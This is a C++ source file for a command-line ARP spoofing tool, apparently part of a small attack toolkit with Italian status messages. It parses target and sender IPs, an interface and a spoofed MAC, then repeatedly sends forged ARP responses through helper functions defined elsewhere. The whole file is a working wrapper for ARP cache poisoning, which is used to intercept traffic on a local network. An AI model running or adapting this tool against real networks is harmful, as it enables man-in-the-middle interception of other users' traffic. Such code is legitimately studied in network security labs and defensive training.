#include "../../utils/inc/ip.h"
#include <CLI/CLI.hpp>
#include <cstdio>
#include <thread>
#include <chrono>

using namespace std;

// **********************
void startArpSpoofing(const string target_ip, const string sender_ip, string spoofedMac, string interface);
// **********************

int main(int argc, char* argv[]) {
    CLI::App app{"Send one or more arp spoofed packet", "atk arp spoofing"};

    // ******** Flag variables ********
    bool verbose = false;
    string target_ip;
    string sender_ip;
    string interface;
    string spoofedMac;
    int times = 1;
    int delay = 1000; // milliseconds
    // ********************************

    app.add_flag("-v,--verbose", verbose, "Verbose output");
    app.add_option("-t,--target", target_ip, "Target IPv4 address")->required();
    app.add_option("-s,--sender", sender_ip, "Sender IPv4 address")->required();
    app.add_option("-i,--interface", interface, "Interface")->required();
    app.add_option("-m,--spoofed_mac", spoofedMac, "Spoofed mac (default: selected interface mac address)");
    app.add_option("-T,--times", times, "Number of times to send the ARP response (default: 1)");
    app.add_option("-d,--delay", delay, "Delay between each ARP response in milliseconds (default: 1000 ms)");


    try {
        app.parse(argc, argv);
    } catch (const CLI::ParseError &e) {
        return app.exit(e);
    }

    // Input validation
    if (!checkValidIpv4(target_ip)) {
        printf("Invalid target IP address: %s\n", target_ip.c_str());
        return 1;
    }
    if (!checkValidIpv4(sender_ip)) {
        printf("Invalid sender IP address: %s\n", sender_ip.c_str());
        return 1;
    }


    if (spoofedMac.empty()) {
        spoofedMac = getMacFromInterface(interface);
    }

    if (verbose) {
        printf("Target IP: %s\n", target_ip.c_str());
        printf("Sender IP: %s\n", sender_ip.c_str());
        printf("Interface: %s\n", interface.c_str());
        printf("Spoofed mac: %s\n", spoofedMac.c_str());
    }

    for (int i = 0; i < times; i++) {
        startArpSpoofing(target_ip, sender_ip, spoofedMac, interface);
        if (i < times - 1) { // avoid delay after last send
            this_thread::sleep_for(chrono::milliseconds(delay));
        }
    }

    return 0;
}

void startArpSpoofing(const string target_ip, const string sender_ip, string spoofedMac, string interface) {
    string target_mac = getMacFromIP(target_ip);

    if (sendARPResponse(target_ip, target_mac, sender_ip, spoofedMac, interface)) {
        cout << "ARP Response inviato con successo" << endl;
    } else {
        cout << "Errore nell'invio dell'ARP Response" << endl;
    }
}

